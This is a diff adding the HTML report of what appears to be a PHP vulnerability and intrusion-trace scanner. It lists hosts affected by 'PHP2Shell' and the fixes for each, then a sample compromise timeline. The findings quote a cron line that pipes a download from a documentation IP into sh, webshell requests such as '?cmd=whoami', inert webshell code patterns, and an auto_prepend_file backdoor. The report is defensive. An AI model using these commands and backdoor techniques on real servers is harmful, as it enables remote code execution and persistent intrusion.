+        <div class="r-fixed"><span class="mono bx-faint">PHP 8.6</span><span class="mono r-ok">≥ 8.6.0RC4</span></div><div class="r-fixed"><span class="mono bx-faint">PHP 8.5</span><span class="mono r-ok">≥ 8.5.12</span></div><div class="r-fixed"><span class="mono bx-faint">PHP 8.4</span><span class="mono r-ok">≥ 8.4.27</span></div><div class="r-fixed"><span class="mono bx-faint">PHP 8.3</span><span class="mono r-ok">≥ 8.3.36</span></div><div class="r-fixed"><span class="mono bx-faint">PHP 8.2</span><span class="mono r-ok">≥ 8.2.35</span></div><div class="r-fixed"><span class="mono bx-faint">PHP 8.1</span><span class="mono r-bad"><span lang="en">no release</span><span lang="zh">无官方修复</span></span></div><div class="r-fixed"><span class="mono bx-faint">PHP 8.0</span><span class="mono r-bad"><span lang="en">no release</span><span lang="zh">无官方修复</span></span></div><div class="r-fixed"><span class="mono bx-faint">PHP 7.4</span><span class="mono r-bad"><span lang="en">no release</span><span lang="zh">无官方修复</span></span></div>
+      </div>
+    </div>
+    
+
+    
+  </section>
+  
+
+  
+  <div class="bx-card r-instances">
+    
+    <details class="r-inst" data-status="vulnerable" open>
+      <summary>
+        <span class="bx-badge" data-status="vulnerable"><span lang="en">Vulnerable</span><span lang="zh">存在漏洞</span></span>
+        <span class="r-inst-path mono">/usr/local/bin/php</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-fpm-old</span> · cli · <b>8.3.35</b></span>
+        <span class="r-inst-env">Docker official image</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-fpm-old · Debian GNU/Linux 13 (trixie)</dd>
+          <dt>version</dt><dd class="mono">8.3.35 <span class="bx-faint">(binary)</span></dd>
+          
+          
+          
+          
+          
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— PHP 8.3.35 is below 8.3.36 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="vulnerable"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.35 is below the fixed release 8.3.36</span></li>
+          </ul>
+          
+          <div class="r-steps">
+            <div class="bx-eyebrow"><span lang="en">What to do</span><span lang="zh">处理建议</span></div>
+            <ol><li>Rebuild on a patched base image: docker pull php:8.3-fpm (needs 8.3.36 or later), then rebuild and redeploy. Running containers keep the old binary until they are replaced.</li></ol>
+          </div>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="vulnerable" open>
+      <summary>
+        <span class="bx-badge" data-status="vulnerable"><span lang="en">Vulnerable</span><span lang="zh">存在漏洞</span></span>
+        <span class="r-inst-path mono">/usr/local/sbin/php-fpm</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-fpm-old</span> · fpm · <b>8.3.35</b></span>
+        <span class="r-inst-env">Docker official image</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-fpm-old · Debian GNU/Linux 13 (trixie)</dd>
+          <dt>version</dt><dd class="mono">8.3.35 <span class="bx-faint">(binary)</span></dd>
+          
+          
+          
+          <dt>running</dt><dd class="mono">pid 11661, 11698, 11699</dd>
+          
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— PHP 8.3.35 is below 8.3.36 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="vulnerable"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.35 is below the fixed release 8.3.36</span></li>
+          </ul>
+          
+          <div class="r-steps">
+            <div class="bx-eyebrow"><span lang="en">What to do</span><span lang="zh">处理建议</span></div>
+            <ol><li>Rebuild on a patched base image: docker pull php:8.3-fpm (needs 8.3.36 or later), then rebuild and redeploy. Running containers keep the old binary until they are replaced.</li></ol>
+          </div>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="vulnerable" open>
+      <summary>
+        <span class="bx-badge" data-status="vulnerable"><span lang="en">Vulnerable</span><span lang="zh">存在漏洞</span></span>
+        <span class="r-inst-path mono">/usr/bin/php8.3</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">vm</span> · cli · <b>8.3.6</b></span>
+        <span class="r-inst-env">System package (apt)</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">host · vm · Ubuntu 24.04.5 LTS</dd>
+          <dt>version</dt><dd class="mono">8.3.6 <span class="bx-faint">(binary)</span></dd>
+          <dt>package</dt><dd class="mono">php8.3-cli 8.3.6-0ubuntu0.24.04.12 <span class="bx-faint">(dpkg, source php8.3)</span></dd>
+          <dt>changelog</dt><dd class="mono">/usr/share/doc/php8.3-cli/changelog.Debian.gz</dd>
+          <dt>aliases</dt><dd class="mono">/bin/php, /bin/php8.3, /usr/bin/php</dd>
+          
+          
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— package 8.3.6-0ubuntu0.24.04.12 is older than the vendor fix 8.3.6-0ubuntu0.24.04.13 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="neutral"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.6 is below the fixed release 8.3.36, but distribution packages often carry backports</span></li><li data-verdict="vulnerable"><span class="r-ev-mark"></span><span class="r-ev-kind mono">vendor</span><span class="r-ev-detail">php8.3-cli 8.3.6-0ubuntu0.24.04.12 &lt; 8.3.6-0ubuntu0.24.04.13 (USN-8948-1, ubuntu 24.04)</span></li>
+          </ul>
+          
+          <div class="r-steps">
+            <div class="bx-eyebrow"><span lang="en">What to do</span><span lang="zh">处理建议</span></div>
+            <ol><li>sudo apt update &amp;&amp; sudo apt install --only-upgrade &#39;php8.3*&#39;</li><li>Confirm: dpkg-query -W php8.3-cli  → expect 8.3.6-0ubuntu0.24.04.13 or later.</li></ol>
+          </div>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="fixed" >
+      <summary>
+        <span class="bx-badge" data-status="fixed"><span lang="en">Fixed</span><span lang="zh">已修复</span></span>
+        <span class="r-inst-path mono">/usr/local/bin/php</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-cli-new</span> · cli · <b>8.3.36</b></span>
+        <span class="r-inst-env">Docker official image</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-cli-new · Debian GNU/Linux 13 (trixie)</dd>
+          <dt>version</dt><dd class="mono">8.3.36 <span class="bx-faint">(binary)</span></dd>
+          
+          
+          
+          
+          <dt>fingerprint</dt><dd class="mono">Hard memory limit of</dd>
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— running 8.3.36, fixed in 8.3.36 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="fixed"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.36 is at or above the fixed release 8.3.36</span></li>
+          </ul>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="fixed" >
+      <summary>
+        <span class="bx-badge" data-status="fixed"><span lang="en">Fixed</span><span lang="zh">已修复</span></span>
+        <span class="r-inst-path mono">/usr/local/bin/php-cgi</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-cli-new</span> · cgi · <b>8.3.36</b></span>
+        <span class="r-inst-env">Docker official image</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-cli-new · Debian GNU/Linux 13 (trixie)</dd>
+          <dt>version</dt><dd class="mono">8.3.36 <span class="bx-faint">(binary)</span></dd>
+          
+          
+          
+          
+          <dt>fingerprint</dt><dd class="mono">Hard memory limit of</dd>
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— running 8.3.36, fixed in 8.3.36 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="fixed"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.36 is at or above the fixed release 8.3.36</span></li>
+          </ul>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="fixed" >
+      <summary>
+        <span class="bx-badge" data-status="fixed"><span lang="en">Fixed</span><span lang="zh">已修复</span></span>
+        <span class="r-inst-path mono">/usr/local/bin/php83 <em class="r-stale">replaced</em></span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-cli-new</span> · cli · <b>8.3.36</b></span>
+        <span class="r-inst-env">Docker official image</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-cli-new · Debian GNU/Linux 13 (trixie)</dd>
+          <dt>version</dt><dd class="mono">8.3.36 <span class="bx-faint">(binary)</span></dd>
+          
+          
+          
+          <dt>running</dt><dd class="mono">pid 21230</dd>
+          <dt>fingerprint</dt><dd class="mono">Hard memory limit of</dd>
+        </dl>
+        <p class="r-note">! binary was replaced on disk; this process still runs the old build — restart it</p>
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— running 8.3.36, fixed in 8.3.36 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="fixed"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.36 is at or above the fixed release 8.3.36</span></li>
+          </ul>
+          
+          <div class="r-steps">
+            <div class="bx-eyebrow"><span lang="en">What to do</span><span lang="zh">处理建议</span></div>
+            <ol><li>Restart the service that runs this process (e.g. systemctl restart php8.3-fpm / apache2 / httpd / lsws); the code on disk is newer than the code in memory.</li></ol>
+          </div>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="fixed" >
+      <summary>
+        <span class="bx-badge" data-status="fixed"><span lang="en">Fixed</span><span lang="zh">已修复</span></span>
+        <span class="r-inst-path mono">/usr/bin/php8.3</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-ubuntu-apache</span> · cli · <b>8.3.6</b></span>
+        <span class="r-inst-env">System package (apt)</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-ubuntu-apache · Ubuntu 24.04.5 LTS</dd>
+          <dt>version</dt><dd class="mono">8.3.6 <span class="bx-faint">(binary)</span></dd>
+          <dt>package</dt><dd class="mono">php8.3-cli 8.3.6-0ubuntu0.24.04.13 <span class="bx-faint">(dpkg, source php8.3)</span></dd>
+          <dt>changelog</dt><dd class="mono">/usr/share/doc/php8.3-cli/changelog.Debian.gz</dd>
+          <dt>aliases</dt><dd class="mono">/usr/bin/php</dd>
+          
+          <dt>fingerprint</dt><dd class="mono">Hard memory limit of</dd>
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— vendor backport 8.3.6-0ubuntu0.24.04.13 in USN-8948-1 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="neutral"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.6 is below the fixed release 8.3.36, but distribution packages often carry backports</span></li><li data-verdict="fixed"><span class="r-ev-mark"></span><span class="r-ev-kind mono">vendor</span><span class="r-ev-detail">php8.3-cli 8.3.6-0ubuntu0.24.04.13 ≥ 8.3.6-0ubuntu0.24.04.13 (USN-8948-1, ubuntu 24.04)</span></li>
+          </ul>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+    <details class="r-inst" data-status="fixed" >
+      <summary>
+        <span class="bx-badge" data-status="fixed"><span lang="en">Fixed</span><span lang="zh">已修复</span></span>
+        <span class="r-inst-path mono">/usr/lib/apache2/modules/libphp8.3.so</span>
+        <span class="r-inst-meta mono"><span class="bx-faint">container:bx-ubuntu-apache</span> · apache2handler · <b>8.3.6</b></span>
+        <span class="r-inst-env">System package (apt)</span>
+      </summary>
+      <div class="r-inst-body">
+        <dl class="bx-kv">
+          <dt>target</dt><dd class="mono">container · bx-ubuntu-apache · Ubuntu 24.04.5 LTS</dd>
+          <dt>version</dt><dd class="mono">8.3.6 <span class="bx-faint">(binary)</span></dd>
+          <dt>package</dt><dd class="mono">libapache2-mod-php8.3 8.3.6-0ubuntu0.24.04.13 <span class="bx-faint">(dpkg, source php8.3)</span></dd>
+          <dt>changelog</dt><dd class="mono">/usr/share/doc/libapache2-mod-php8.3/changelog.Debian.gz</dd>
+          
+          <dt>running</dt><dd class="mono">pid 20975, 20976, 20977, 20978, 20979, 20980</dd>
+          <dt>fingerprint</dt><dd class="mono">Hard memory limit of</dd>
+        </dl>
+        
+        
+        <div class="r-assess">
+          <div class="r-assess-head"><strong>PHP2Shell</strong> <span class="bx-faint">— vendor backport 8.3.6-0ubuntu0.24.04.13 in USN-8948-1 · <span lang="en">confidence</span><span lang="zh">置信度</span> high</span></div>
+          <ul class="r-evidence">
+            <li data-verdict="neutral"><span class="r-ev-mark"></span><span class="r-ev-kind mono">version</span><span class="r-ev-detail">PHP 8.3.6 is below the fixed release 8.3.36, but distribution packages often carry backports</span></li><li data-verdict="fixed"><span class="r-ev-mark"></span><span class="r-ev-kind mono">vendor</span><span class="r-ev-detail">libapache2-mod-php8.3 8.3.6-0ubuntu0.24.04.13 ≥ 8.3.6-0ubuntu0.24.04.13 (USN-8948-1, ubuntu 24.04)</span></li>
+          </ul>
+          
+        </div>
+        
+      </div>
+    </details>
+    
+  </div>
+  
+
+  
+
+  
+  <section class="r-section" id="trace">
+    <div class="r-section-head">
+      <h2><span lang="en">Intrusion trace</span><span lang="zh">入侵溯源</span></h2>
+      <span class="bx-faint mono">9 files · 2 logs · 9 lines · since 2016-10-24</span>
+    </div>
+
+    <div class="r-trace-grid">
+      <div class="r-findings">
+        
+        
+        <article class="bx-card r-finding" data-sev="high">
+          <header>
+            <span class="bx-badge" data-sev="high"><span lang="en">High</span><span lang="zh">高</span></span>
+            <h3><span lang="en">Requests to a flagged file</span><span lang="zh">有请求访问了被标记的文件</span></h3>
+            <span class="bx-faint mono r-rule">log.flagged-file-access</span>
+          </header>
+          <div class="r-loc mono">/var/log/nginx/shop.access.log <span class="bx-faint">×4</span> <span class="bx-faint">· 2026-10-22 02:09</span></div>
+          <pre class="bx-code r-snippet">198.51.100.23 - - [21/Oct/2026:16:04:20 &#43;0000] &#34;POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1&#34; 200 31 &#34;-&#34; &#34;Mozilla/5.0&#34;</pre>
+          <p class="bx-muted r-why"><span lang="en">The file /var/www/shop/public/wp-content/uploads/2026/10/thumb.php was flagged by the file scan and was requested over HTTP.</span><span lang="zh">文件扫描标记的 /var/www/shop/public/wp-content/uploads/2026/10/thumb.php 曾被 HTTP 请求访问。</span></p>
+          <ul class="r-details mono"><li>file /var/www/shop/public/wp-content/uploads/2026/10/thumb.php</li><li>file /var/www/shop/public/lib/compat.php</li><li>first 2026-10-21T16:04:20Z, last 2026-10-22T02:09:41Z</li><li>top clients: 198.51.100.23×4</li><li>status codes: 200×4</li><li>198.51.100.23 - - [21/Oct/2026:16:04:20 &#43;0000] &#34;POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1&#34; 200 31 &#34;-&#34; &#34;Mozilla/5.0&#34;</li><li>198.51.100.23 - - [21/Oct/2026:16:05:12 &#43;0000] &#34;POST /lib/compat.php HTTP/1.1&#34; 200 8 &#34;-&#34; &#34;Mozilla/5.0&#34;</li><li>198.51.100.23 - - [21/Oct/2026:16:07:55 &#43;0000] &#34;GET /lib/compat.php?cmd=whoami HTTP/1.1&#34; 200 9 &#34;-&#34; &#34;curl/8.5.0&#34;</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="high">
+          <header>
+            <span class="bx-badge" data-sev="high"><span lang="en">High</span><span lang="zh">高</span></span>
+            <h3><span lang="en">Successful POST to a PHP file in an upload directory</span><span lang="zh">成功 POST 到上传目录中的 PHP 文件</span></h3>
+            <span class="bx-faint mono r-rule">log.post-upload-php</span>
+          </header>
+          <div class="r-loc mono">/var/log/nginx/shop.access.log <span class="bx-faint">×1</span> <span class="bx-faint">· 2026-10-21 16:04</span></div>
+          <pre class="bx-code r-snippet">198.51.100.23 - - [21/Oct/2026:16:04:20 &#43;0000] &#34;POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1&#34; 200 31 &#34;-&#34; &#34;Mozilla/5.0&#34;</pre>
+          <p class="bx-muted r-why"><span lang="en">Legitimate applications do not execute PHP from upload directories.</span><span lang="zh">正常应用不会执行上传目录中的 PHP 文件。</span></p>
+          <ul class="r-details mono"><li>first 2026-10-21T16:04:20Z, last 2026-10-21T16:04:20Z</li><li>top clients: 198.51.100.23×1</li><li>status codes: 200×1</li><li>198.51.100.23 - - [21/Oct/2026:16:04:20 &#43;0000] &#34;POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1&#34; 200 31 &#34;-&#34; &#34;Mozilla/5.0&#34;</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="high">
+          <header>
+            <span class="bx-badge" data-sev="high"><span lang="en">High</span><span lang="zh">高</span></span>
+            <h3><span lang="en">Suspicious scheduled task</span><span lang="zh">可疑的计划任务</span></h3>
+            <span class="bx-faint mono r-rule">persist.cron</span>
+          </header>
+          <div class="r-loc mono">/var/spool/cron/crontabs/www-data:1 <span class="bx-faint">· 2026-10-21 16:09</span></div>
+          <pre class="bx-code r-snippet">*/10 * * * * curl -fsSL http://198.51.100.23/u | sh</pre>
+          <p class="bx-muted r-why"><span lang="en">Line downloads and pipes into a shell.</span><span lang="zh">该行下载内容并直接交给 Shell 执行。</span></p>
+          
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="high">
+          <header>
+            <span class="bx-badge" data-sev="high"><span lang="en">High</span><span lang="zh">高</span></span>
+            <h3><span lang="en">PHP auto_prepend/append_file set in .user.ini</span><span lang="zh">.user.ini 中设置了 auto_prepend/append_file</span></h3>
+            <span class="bx-faint mono r-rule">config.auto-prepend</span>
+          </header>
+          <div class="r-loc mono">/var/www/shop/public/.user.ini:1 <span class="bx-faint">· 2026-10-21 16:06</span></div>
+          <pre class="bx-code r-snippet">auto_prepend_file = /var/www/shop/public/img/.cache.png </pre>
+          <p class="bx-muted r-why"><span lang="en">Every request on this directory first runs /var/www/shop/public/img/.cache.png. A favourite way to keep a backdoor loaded.</span><span lang="zh">该目录下的每个请求都会先执行 /var/www/shop/public/img/.cache.png，这是常见的后门驻留方式。</span></p>
+          
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="high">
+          <header>
+            <span class="bx-badge" data-sev="high"><span lang="en">High</span><span lang="zh">高</span></span>
+            <h3><span lang="en">Function name taken from the request</span><span lang="zh">函数名直接取自请求参数</span></h3>
+            <span class="bx-faint mono r-rule">php.request-callable</span>
+          </header>
+          <div class="r-loc mono">/var/www/shop/public/lib/compat.php:1 <span class="bx-faint">· 2026-10-21 16:05</span></div>
+          <pre class="bx-code r-snippet">… demo fixture — inert */ if (false) { $_POST[&#39;k&#39;]($_POST[&#39;v&#39;]); } </pre>
+          <p class="bx-muted r-why"><span lang="en">$_POST[&#39;x&#39;]($_POST[&#39;y&#39;]) lets the attacker call any function.</span><span lang="zh">$_POST[&#39;x&#39;]($_POST[&#39;y&#39;]) 这种写法允许攻击者调用任意函数。</span></p>
+          <ul class="r-details mono"><li>requested over HTTP (see /var/log/nginx/shop.access.log)</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="high">
+          <header>
+            <span class="bx-badge" data-sev="high"><span lang="en">High</span><span lang="zh">高</span></span>
+            <h3><span lang="en">eval/assert of decoded data</span><span lang="zh">对解码后的数据执行 eval/assert</span></h3>
+            <span class="bx-faint mono r-rule">php.eval-decoded</span>
+          </header>
+          <div class="r-loc mono">/var/www/shop/public/wp-content/uploads/2026/10/thumb.php:1 <span class="bx-faint">· 2026-10-21 16:04</span></div>
+          <pre class="bx-code r-snippet">… demo fixture — inert */ if (false) { eval(base64_decode(&#39;ZGVtbw==&#39;)); } </pre>
+          <p class="bx-muted r-why"><span lang="en">Executing decoded strings is the classic packer used by webshells to hide their payload.</span><span lang="zh">执行解码后的字符串是 Webshell 隐藏载荷最常见的手法。</span></p>
+          <ul class="r-details mono"><li>located in an upload/cache directory</li><li>requested over HTTP (see /var/log/nginx/shop.access.log)</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="medium">
+          <header>
+            <span class="bx-badge" data-sev="medium"><span lang="en">Medium</span><span lang="zh">中</span></span>
+            <h3><span lang="en">Shell commands passed as request parameters</span><span lang="zh">请求参数中携带 Shell 命令</span></h3>
+            <span class="bx-faint mono r-rule">log.command-param</span>
+          </header>
+          <div class="r-loc mono">/var/log/nginx/shop.access.log <span class="bx-faint">×1</span> <span class="bx-faint">· 2026-10-21 16:07</span></div>
+          <pre class="bx-code r-snippet">198.51.100.23 - - [21/Oct/2026:16:07:55 &#43;0000] &#34;GET /lib/compat.php?cmd=whoami HTTP/1.1&#34; 200 9 &#34;-&#34; &#34;curl/8.5.0&#34;</pre>
+          <p class="bx-muted r-why"><span lang="en">Typical of interacting with a webshell.</span><span lang="zh">这是操作 Webshell 的典型特征。</span></p>
+          <ul class="r-details mono"><li>first 2026-10-21T16:07:55Z, last 2026-10-21T16:07:55Z</li><li>top clients: 198.51.100.23×1</li><li>status codes: 200×1</li><li>198.51.100.23 - - [21/Oct/2026:16:07:55 &#43;0000] &#34;GET /lib/compat.php?cmd=whoami HTTP/1.1&#34; 200 9 &#34;-&#34; &#34;curl/8.5.0&#34;</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="medium">
+          <header>
+            <span class="bx-badge" data-sev="medium"><span lang="en">Medium</span><span lang="zh">中</span></span>
+            <h3><span lang="en">Out-of-memory during request start-up</span><span lang="zh">请求启动阶段发生内存耗尽</span></h3>
+            <span class="bx-faint mono r-rule">log.early-oom</span>
+          </header>
+          <div class="r-loc mono">/var/log/php8.2-fpm.log <span class="bx-faint">×1</span> <span class="bx-faint">· 2026-10-21 16:01</span></div>
+          <pre class="bx-code r-snippet">[21-Oct-2026 16:01:07] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0</pre>
+          <p class="bx-muted r-why"><span lang="en">&#39;in Unknown on line 0&#39; means memory ran out before any script ran — while PHP was parsing the request. That is the trigger condition of CVE-2026-109618.</span><span lang="zh">“in Unknown on line 0”说明内存在任何脚本运行之前、PHP 解析请求时就已耗尽，这正是 CVE-2026-109618 的触发条件。</span></p>
+          <ul class="r-details mono"><li>first 2026-10-21T16:01:07Z, last 2026-10-21T16:01:07Z</li><li>[21-Oct-2026 16:01:07] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="medium">
+          <header>
+            <span class="bx-badge" data-sev="medium"><span lang="en">Medium</span><span lang="zh">中</span></span>
+            <h3><span lang="en">PHP worker crashes (segfault / heap corruption)</span><span lang="zh">PHP 工作进程崩溃（段错误或堆损坏）</span></h3>
+            <span class="bx-faint mono r-rule">log.worker-crash</span>
+          </header>
+          <div class="r-loc mono">/var/log/php8.2-fpm.log <span class="bx-faint">×3</span> <span class="bx-faint">· 2026-10-21 16:03</span></div>
+          <pre class="bx-code r-snippet">[21-Oct-2026 15:58:41] WARNING: [pool www] child 3812 exited on signal 11 (SIGSEGV) after 41.200713 seconds from start</pre>
+          <p class="bx-muted r-why"><span lang="en">PHP2Shell is a memory-corruption bug; exploitation attempts often crash workers before they succeed. Crashes also happen for benign reasons — check timing against suspicious requests.</span><span lang="zh">PHP2Shell 属于内存破坏漏洞，利用尝试在成功前常会让进程崩溃。崩溃也可能有无害的原因，请结合可疑请求的时间判断。</span></p>
+          <ul class="r-details mono"><li>first 2026-10-21T15:58:41Z, last 2026-10-21T16:03:09Z</li><li>[21-Oct-2026 15:58:41] WARNING: [pool www] child 3812 exited on signal 11 (SIGSEGV) after 41.200713 seconds from start</li><li>[21-Oct-2026 15:58:43] WARNING: [pool www] child 3820 exited on signal 11 (SIGSEGV) after 2.004112 seconds from start</li><li>[21-Oct-2026 16:03:09] WARNING: [pool www] child 3851 exited on signal 11 (SIGSEGV) after 0.912034 seconds from start</li></ul>
+        </article>
+        
+        <article class="bx-card r-finding" data-sev="medium">
+          <header>
+            <span class="bx-badge" data-sev="medium"><span lang="en">Medium</span><span lang="zh">中</span></span>
+            <h3><span lang="en">PHP code hidden in an image file</span><span lang="zh">图片文件中藏有 PHP 代码</span></h3>
+            <span class="bx-faint mono r-rule">file.php-in-image</span>
+          </header>
+          <div class="r-loc mono">/var/www/shop/public/img/.cache.png:3 <span class="bx-faint">· 2026-10-21 16:05</span></div>
+          <pre class="bx-code r-snippet">·PNG  · &lt;?php /* demo fixture — inert */ ?&gt;</pre>
+          <p class="bx-muted r-why"><span lang="en">Polyglot images are used with include() or a handler override to run code.</span><span lang="zh">这种“图片马”配合 include() 或处理器覆盖即可执行代码。</span></p>
+          
+        </article>
+        
+      </div>
+      <aside class="bx-card r-tl">
+        <div class="bx-card-head"><span class="bx-eyebrow"><span lang="en">Timeline</span><span lang="zh">时间线</span></span><span class="bx-faint mono">UTC</span></div>
+        <div class="bx-card-body">
+          
+          <ol class="bx-timeline">
+            <li class="day">2026-10-22</li><li class="ev" data-sev="high"><time>02:09:41</time><span class="dot"></span><span class="what">Requests to a flagged file — last seen<span class="path">/var/log/nginx/shop.access.log</span></span></li><li class="day">2026-10-21</li><li class="ev" data-sev="medium"><time>15:58:41</time><span class="dot"></span><span class="what">PHP worker crashes (segfault / heap corruption) — first seen (3 total)<span class="path">/var/log/php8.2-fpm.log</span></span></li><li class="ev" data-sev="medium"><time>16:01:07</time><span class="dot"></span><span class="what">Out-of-memory during request start-up — first seen (1 total)<span class="path">/var/log/php8.2-fpm.log</span></span></li><li class="ev" data-sev="medium"><time>16:03:09</time><span class="dot"></span><span class="what">PHP worker crashes (segfault / heap corruption) — last seen<span class="path">/var/log/php8.2-fpm.log</span></span></li><li class="ev" data-sev="high"><time>16:04:11</time><span class="dot"></span><span class="what">flagged file last modified: eval/assert of decoded data<span class="path">/var/www/shop/public/wp-content/uploads/2026/10/thumb.php</span></span></li><li class="ev" data-sev="info"><time>16:04:11</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/wp-content/uploads/2026/10/thumb.php</span></span></li><li class="ev" data-sev="high"><time>16:04:20</time><span class="dot"></span><span class="what">Requests to a flagged file — first seen (4 total)<span class="path">/var/log/nginx/shop.access.log</span></span></li><li class="ev" data-sev="high"><time>16:04:20</time><span class="dot"></span><span class="what">Successful POST to a PHP file in an upload directory — first seen (1 total)<span class="path">/var/log/nginx/shop.access.log</span></span></li><li class="ev" data-sev="high"><time>16:05:02</time><span class="dot"></span><span class="what">flagged file last modified: Function name taken from the request<span class="path">/var/www/shop/public/lib/compat.php</span></span></li><li class="ev" data-sev="info"><time>16:05:02</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/lib/compat.php</span></span></li><li class="ev" data-sev="medium"><time>16:05:40</time><span class="dot"></span><span class="what">flagged file last modified: PHP code hidden in an image file<span class="path">/var/www/shop/public/img/.cache.png</span></span></li><li class="ev" data-sev="high"><time>16:06:15</time><span class="dot"></span><span class="what">flagged file last modified: PHP auto_prepend/append_file set in .user.ini<span class="path">/var/www/shop/public/.user.ini</span></span></li><li class="ev" data-sev="medium"><time>16:07:55</time><span class="dot"></span><span class="what">Shell commands passed as request parameters — first seen (1 total)<span class="path">/var/log/nginx/shop.access.log</span></span></li><li class="ev" data-sev="high"><time>16:09:30</time><span class="dot"></span><span class="what">Suspicious scheduled task (downloads and pipes into a shell)<span class="path">/var/spool/cron/crontabs/www-data</span></span></li><li class="day">2026-06-02</li><li class="ev" data-sev="info"><time>09:12:00</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/cart.php</span></span></li><li class="ev" data-sev="info"><time>09:12:00</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/checkout.php</span></span></li><li class="ev" data-sev="info"><time>09:12:00</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/index.php</span></span></li><li class="ev" data-sev="info"><time>09:12:00</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/lib/db.php</span></span></li><li class="ev" data-sev="info"><time>09:12:00</time><span class="dot"></span><span class="what">PHP file modified<span class="path">/var/www/shop/public/lib/session.php</span></span></li>
+          </ol>
+        </div>
+      </aside>
+    </div>
+
+    <div class="bx-card r-scope">
+      <div class="bx-card-head"><span class="bx-eyebrow"><span lang="en">Scope</span><span lang="zh">检查范围</span></span></div>
+      <div class="bx-table-wrap"><table class="bx-table">
